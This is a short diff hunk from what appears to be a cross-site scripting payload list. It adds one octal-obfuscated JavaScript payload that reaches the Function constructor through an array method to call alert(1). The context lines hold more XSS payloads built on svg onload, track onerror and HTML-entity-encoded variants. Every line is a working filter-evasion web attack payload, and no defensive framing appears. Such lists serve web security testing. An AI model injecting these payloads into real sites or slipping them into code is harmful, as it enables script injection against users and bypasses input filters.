@@ -71,3 +71,4 @@ javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>
 </script><svg/onload=alert(0)>
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 "><track/onerror='confirm`1`'>
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()
